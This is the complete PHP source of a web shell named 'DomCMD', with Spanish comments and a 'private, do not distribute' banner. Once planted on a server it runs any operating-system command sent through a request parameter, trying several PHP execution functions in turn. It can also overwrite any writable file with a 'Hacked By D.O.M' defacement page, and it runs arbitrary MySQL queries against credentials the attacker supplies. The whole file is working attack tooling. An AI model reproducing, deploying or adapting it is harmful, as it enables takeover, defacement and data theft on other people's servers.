 <head>
<title>[ DOM TOOL v.0.2 ] PRIV8 Not distribut!</title>
<style>body {background: #FFFFFF ;}body,table {font-family: Fixedsys ;font-size: 8pt ;color: #3366CC ;text-align: justify ;scrollbar-face-color: #3366CC ;scrollbar-darkshadow-color: #3366CC ;scrollbar-shadow-color: #FFFFFF ;scrollbar-highlight-color: #FFFFFF ;scrollbar-3dlight-color: #9999CC ;scrollbar-track-color: #6699CC;scrollbar-arrow-color: #FFFFFF ;}a {color: #3366CC ;text-decoration: none ;font-weight: bold ;}TABLE { border: thin dashed #6699CC;border-collapse: collapse }TEXTAREA { border: #757575 1 solid ;font-family: verdana ;font-size: 8pt ;background: #3366CC; color: #FFFFFF;} INPUT, TEXT{ border: #757575 1 solid ;font-family: verdana ;font-size: 8pt ;background: #3366CC; color: #FFFFFF}</style>
</head>
 <?
// DomCMD v.0.1
// Coded by Cyberlocos
// Private do not distribute!!!
// Dont copy, dont be lame
// Private version!!



// Dont modifie

// Aqui declaramos que cmd es lo que mando el wey con un request, algo tedioso no?
if(!empty($cmd)){ $cmd = $_REQUEST['cmd']; }else{ $cmd = "";}

$todeface = $_REQUEST['todeface'];
$defacer = $_REQUEST['defaxor'];
if($todeface){
$fp = @fopen($todeface,'w');
$mensaje='
<html>
<title>Hacked By D.O.M & '.$defacer.'</title>
<div align="center">
  <p><strong>HACKED By D.O.M & '.$defacer.'</strong></p>
  <p><img src="http://davidu2.iespana.es/05_1024.jpg" width="462" height="206"></p>
  <p><strong>0ops Sorry Admin D.O.M Was Here and Owned You Box </strong></p>
<br>We Are: DaViDu - ArCaX-ATH - XGnDX - Lympex - Rootbox -[thor]
  <p>[@]- Hey People and Admin - Just Remenber Jesus Love You - Greetz By0nd Crew -[@] </p>
</div>
<br><center><EMBED src=http://www.dom-team.com/gulumcan.wma width=70 height=25 loop="true" autostart="true"> 
</html>
  ';
 if(fwrite($fp,$mensaje)){
 echo "Defaced :".$todeface;
 }else{
 echo "Couldnt deface :".$todeface;
 }
 fclose($fp);
}
//Aqui estan los datos de la shell
$v = " v.0.1 private!";
$nombre = "DOMCMD";
$copy = "Cyberlocos";

//Aqui inicializamos
$currentpath = getcwd();
$os = PHP_OS;

//Aqui detectamos si es wind0ws
if ((strpos($os, 'WIN')!==false)){
$wind0ws = "chingados"; 
}

//Nos fijamos si esta en safemode
$safem0d = @ini_get('safe_mode');
if ($safem0d){ $safe="Activado"; }else{ $safe="Desactivado"; }

//Command detection .. part of the tool25 tool
if($safe=="Activado"){
$type="safemode";$commandtoexec=$type;
}elseif(function_exists('shell_exec')){$type="shell";$commandtoexec="shell_exec";}
elseif(function_exists('passthru')){$type="passthru";$commandtoexec="passthru";}
elseif(function_exists('system')){$type="system";$commandtoexec="system";}
elseif(function_exists('exec')){$type="execc";$commandtoexec="exec";}
elseif(function_exists('popen')){$type="popenn";$commandtoexec="popen";}
elseif(function_exists('proc_open')){$type="procc";$commandtoexec="proc_open";}
else {$fe="nofunction";$commandtoexec=$fe;}


function safemode($what){echo "Te la pelaste.. el servidor esta en safemode :(";}
function nofunction($what){echo "No se puede usar la shell, los comandos están deshabilitados.";}
function shell($what){echo(shell_exec($what));}
function popenn($what){
   $handle=popen("$what", "r");
   $out=@fread($handle, 2096);
   echo $out;
   @pclose($handle);
}
function execc($what){
   exec("$what",$array_out);
   $out=implode("\n",$array_out);
   echo $out;
}
function procc($what){
   //na sequencia: stdin, stdout, sterr
   if($descpec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"),)){
   $process = @proc_open("$what",$descpec,$pipes);
   if (is_resource($process)) {
      fwrite($pipes[0], "");
      fclose($pipes[0]);

      while(!feof($pipes[2])) {
         $erro_retorno = fgets($pipes[2], 4096);
         if(!empty($erro_retorno)) echo $erro_retorno;// 
      }
          fclose($pipes[2]);

      while(!feof($pipes[1])) {
         echo fgets($pipes[1], 4096);
      }
      fclose($pipes[1]);

      $ok_p_fecha = @proc_close($process);
   }else echo "La versión (".phpversion().") de php no soporta la función proc_open().";
}else echo "La versión (".phpversion().") de php no tiene proc_open() o está deshabilitado en el archivo php.ini";
}

if($wind0ws=="chingados"){
echo "";
}else{
$login=@posix_getuid(); 
$euid=@posix_geteuid(); 
$gid=@posix_getgid(); 
}

$ip=@gethostbyname($_SERVER['HTTP_HOST']);


echo "<center><h5>[ ".$nombre.$v." ]<br>".$copy."</h5></center>";
echo '<center>Info table:<br></center>
<table width="80%" align="center" valign="top" border="1">
  <tr>
    <td>';
	if($wind0ws=="chingados"){
    	echo "sysname: <b>Windows</b><br>";
	}else{
  		foreach(posix_uname() AS $key=>$value) {
			print $key .": <b>". $value ."</b><br>";
	}
	}
	echo "servidor: <b>".$SERVER_SOFTWARE.$SERVER_VERSION."</b><br>";
	echo "ip servidor: <b>".$ip."</b><br>";
	if($wind0ws=="chingados"){ echo ""; }else{ echo "Usuario: <b>uid(".$login.") euid(".$euid.") guid(".$gid.")</b><br>"; }
	echo "safemode: <b>".$safe."</b><br>";
	echo "Uname: <b>".php_uname()."</b><br>";
	echo "Directorio Actual: <b>".$currentpath."</b><br>";
	echo "Permisos de escritura en directorio actual: <b>"; if(@is_writable($currentpath)){ echo "<b>si</b>"; }else{ echo "<b>no</b>"; }
	echo "</b><br>Command to exec: <b>".$commandtoexec."</b>";
echo '</td>
  </tr>
</table><br>
';
echo '<center>Sh3ll:<br></center>
<table width="80%" align="center" valign="top" border="1">
  <tr>
    <td>';
	if($HTTPS=="on"){
	$protocolo = "https://";
	}else{
	$protocolo = "http://";
	}
	$uri = $protocolo.$HTTP_HOST."/";
	$uri .= $REQUEST_URI;
echo '<center><form method="POST" action="'.$uri.'"><b>Cmd: </b><input name="cmd" style="width: 350" type="text" value="'.$cmd.'" > <input type="submit" value="Snd CMD">';
echo "<br><TEXTAREA COLS=\"115\" ROWS=\"15\">";
ob_start();

$type("$cmd");

$output=ob_get_contents();ob_end_clean();
if (empty($cmd)) echo ("
".$nombre.$v." by ".$copy." ... Esperando un comando
");
else{
echo "Ejecutando \"".$cmd."\" utilizando \"".$commandtoexec."\"\r\n\r\n";
if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output)); 
}
echo "</textarea><br></center>";

echo '</td>
  </tr>
</table></form>
';

echo '<center>Deface:<br></center>
<table width="80%" align="center" valign="top" border="1">
  <tr>
    <td><form method="POST" action="'.$uri.'">';
	
	echo '
	<center><input type="submit" value="Deface"> ---> <input style="width: 250" type="text" name="todeface"> by <input style="width: 150" type="text" value="[th0r]" name="defaxor">';
	
echo '</center></td>
  </tr>
</table></form><br>';


echo '<center>Sql Querys:<br></center>
<table width="80%" align="center" valign="top" border="1">
  <tr>
    <td><form method="POST" action="'.$uri.'">';
?>
<?
if(!$myhost || !$myuser || !$mypass || !$quer){
echo '<center>
Host: <input type="text" name="myhost" value="localhost">
User: <input type="text" name="myuser" value="user">
Pass: <input type="text" name="mypass" value="password">
<br><br></center>
<textarea name="quer" cols="115" rows="6">';


echo '</textarea>
<br>
<center><input type="submit" name="submit" value="Send"></center>';
}else{
echo '<center>
Host: <input type="text" name="myhost" value="localhost">
User: <input type="text" name="myuser" value="user">
Pass: <input type="text" name="mypass" value="password">
<br><br></center>
<textarea name="quer" cols="115" rows="6">';
ob_start();
$db=@mysql_connect($myhost,$myuser,$mypass);
if(!$db)
echo "*** Error al conectar ...";

$sql = $quer;
if(!$result=@mysql_query($sql,$db)){
echo "Error al ejecutar el query";
}
$output=ob_get_contents();ob_end_clean();
echo $output;
echo '</textarea>
<br>
<center><input type="submit" name="submit" value="Send"></center>
';
}
?>
<?
echo '</center></td>
  </tr>
</table></form><br>';
?>